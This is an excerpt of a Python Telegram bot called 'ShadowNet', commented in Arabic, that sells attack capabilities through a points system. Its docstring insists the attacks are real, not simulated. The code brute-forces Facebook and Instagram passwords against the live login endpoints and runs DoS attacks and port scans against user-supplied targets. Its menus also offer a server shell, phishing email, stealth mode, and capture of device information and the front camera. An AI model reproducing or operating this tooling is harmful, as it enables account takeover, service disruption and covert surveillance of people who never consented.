...
"""
ShadowNet Framework v8.11 - النسخة النهائية بدون محاكاة
- جميع الوظائف تعمل بشكل حقيقي (لا محاكاة)
- دوال التخمين (فيسبوك، انستغرام) تحاول تسجيل الدخول فعلياً
- دوال الهجمات (DoS، مسح المنافذ، SSL) حقيقية
- ترتيب الأزرار حسب طلب المستخدم
- إصلاح كامل للأخطاء
"""
...
def deduct_points(chat_id, amount, reason):
    ...
    c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    if not row or len(row) == 0 or row[0] < amount:
        conn.close()
        return False
    c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
    c.execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)", (chat_id, -amount, reason, datetime.now().isoformat()))
...
# ===================== دوال الهجمات الحقيقية =====================
def port_scan(target):
    """مسح منافذ حقيقي باستخدام socket"""
    ...
    try:
        ...
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                ...
                return {'valid': True, 'issuer': cert.get('issuer', ''), 'expiry': cert.get('notAfter', '')}
    except:
        return {'valid': False, 'error': 'فشل'}

def brute_force_facebook(email, passwords):
    """تخمين كلمة سر فيسبوك - محاولة تسجيل دخول حقيقية"""
    ...
    try:
        ...
        for pwd in passwords[:20]:
            data = {'email': email, 'pass': pwd, 'fb_dtsg': token, 'login': 'Log In'}
            login_resp = session.post(login_url, data=data, allow_redirects=False, timeout=10)
...
def brute_force_instagram(username, passwords):
    """تخمين كلمة سر انستغرام - محاولة تسجيل دخول حقيقية"""
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'X-Requested-With': 'XMLHttpRequest'})
    try:
        ...
        for pwd in passwords[:20]:
            ...
            login_resp = session.post(login_url, data=data, headers=headers, timeout=10)
...
def dos_attack(target, port, duration):
    ...
    try:
        ...
        pass
    return {'packets_sent': sent, 'duration': duration}
...
def build_main_menu(chat_id):
    try:
        ...
        if perms.get('list_devices', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("الأجهزة", callback_data="list_devices"))
        ...
        if perms.get('admin_panel', True) and is_admin_user:
        ...
        if perms.get('protection_menu', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("الحماية", callback_data="protection_menu"))
        if perms.get('hacking_menu', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("القائمة السرية", callback_data="hacking_menu"))
        if perms.get('lock_chat', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"))
        if perms.get('admin_permissions', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"))
        if perms.get('user_activity', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity"))
        if perms.get('send_to_user', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user"))
        if perms.get('admin_points_menu', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"))
        if perms.get('admin_ban_menu', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("حظر المستخدمين", callback_data="admin_ban_menu"))
        if perms.get('download_video', True):
            markup.row(types.InlineKeyboardButton("تحميل فيديو", callback_data="download_video"))
        if perms.get('phishing_email', True) and is_admin_user:
        ...
        if perms.get('protect_lock', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
        if perms.get('toggle_stealth', True) and is_admin_user:
            markup.row(types.InlineKeyboardButton("وضع التخفي", callback_data="toggle_stealth"))
        ...
        if user_can_use_collector(chat_id):
            markup.row(types.InlineKeyboardButton("معلومات الجهاز", callback_data="device_info"))
            markup.row(types.InlineKeyboardButton("الكاميرا الأمامية", callback_data="camera_hack"))

        return markup
    except Exception as e:
        logger.error(f"Error building main menu: {e}\n{traceback.format_exc()}")
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("القائمة الرئيسية", callback_data="back_main"))
        return markup
...
def build_hacking_menu():
    ...
    markup.row(types.InlineKeyboardButton("هجوم DoS", callback_data="hack_dos"), types.InlineKeyboardButton("Shell", callback_data="hack_shell"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup
...
def process_callback(call):
    try:
        ...
        if data == "bruteforce_fb":
            ...
            safe_send(chat_id, "أدخل البريد أو الهاتف لفيسبوك (حقيقي)")
            return
        if data == "bruteforce_ig":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_ig_user"
            safe_send(chat_id, "أدخل اسم مستخدم انستغرام (حقيقي)")
            return
        if data == "hack_shell":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_shell"
            safe_send(chat_id, "أدخل الأمر (حقيقي على نظام السيرفر)")
            return
        if data == "hack_dos":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_dos"
            safe_send(chat_id, "الصيغة: IP|المنفذ|المدة(ثانية) (DoS حقيقي)")
            return
    ...
    try:
        ...
        if text.startswith('/start'):
            ...
            if 'ref_' in text:
                ...
                ref_user = c.fetchone()
                if ref_user and len(ref_user) > 0 and ref_user[0] != chat_id:
        ...
        if state == "waiting_portscan":
            ...
            if ports:
                safe_send(chat_id, f"✅ المنافذ المفتوحة: {', '.join(map(str, ports))}")
            else:
        ...
        if state == "waiting_ssl":
            ...
            if result.get('valid'):
                safe_send(chat_id, f"✅ شهادة SSL صالحة\nالجهة المصدرة: {result.get('issuer', 'غير معروف')}\nتنتهي: {result.get('expiry', 'غير معروف')}")
            else:
        ...
        if state == "waiting_fb_user":
            ...
            safe_send(chat_id, "أرسل قائمة كلمات السر مفصولة بفواصل (أو 'default' لاستخدام قائمة افتراضية)")
            return
        if state == "waiting_fb_passwords":
            ...
            safe_send(chat_id, f"🔄 جاري تخمين كلمة سر فيسبوك لـ {user} ... (قد يستغرق وقتاً)")
            ...
            if result['success']:
                ...
                c.execute("INSERT INTO scan_results (target, scan_type, results, created_at) VALUES (?, ?, ?, ?)",
                          (user, 'facebook_bruteforce', json.dumps(result), datetime.now().isoformat()))
                conn.commit()
                conn.close()
            else:
        ...
        if state == "waiting_ig_passwords":
            ...
            if text.lower() == 'default':
                ...
                passwords = [p.strip() for p in text.split(',')]
            safe_send(chat_id, f"🔄 جاري تخمين كلمة سر انستغرام لـ {user} ... (قد يستغرق وقتاً)")
            ...
            if result['success']:
                ...
                c = conn.cursor()
                c.execute("INSERT INTO scan_results (target, scan_type, results, created_at) VALUES (?, ?, ?, ?)",
                          (user, 'instagram_bruteforce', json.dumps(result), datetime.now().isoformat()))
                conn.commit()
                conn.close()
            else:
                safe_send(chat_id, f"❌ فشل التخمين. تم تجربة {result['attempts']} كلمة سر")
        ...
        if state == "waiting_dos":
            ...
            if len(parts) >= 2:
                ...
                safe_send(chat_id, f"⚡ بدء هجوم DoS حقيقي على {target}:{port} لمدة {duration} ثانية...")
                result = dos_attack(target, port, duration)
                safe_send(chat_id, f"✅ انتهى الهجوم. تم إرسال {result['packets_sent']} حزمة.")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة. استخدم: IP|المنفذ|المدة")
            user_states[chat_id] = None
            return
...
def start_bot():
    ...
    for attempt in range(3):
        try:
            ...
            print(f"⚠️ محاولة {attempt+1}: فشل حذف webhook: {e}")
            time.sleep(2)
    else:
        print("⚠️ فشل حذف webhook بعد 3 محاولات، لكن سنواصل.")
    ...
    while True:
        try:
            ...
            error_msg = str(e)
            if "409" in error_msg:
                print("⚠️ خطأ 409: تم اكتشاف مثيل آخر للبوت. جاري إعادة المحاولة بعد 10 ثوانٍ...")
                try:
                    bot.delete_webhook()
                    print("✅ تم حذف webhook أثناء محاولة إعادة الاتصال.")
                except:
                    pass
                time.sleep(10)
            else:
...
if __name__ == '__main__':
    print("✅ ShadowNet v8.11 بدأ التهيئة...")
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=bot_ping, daemon=True).start()
    threading.Thread(target=start_bot, daemon=True).start()
    print("✅ تم بدء جميع الخيوط، تشغيل Flask على المنفذ", PORT)
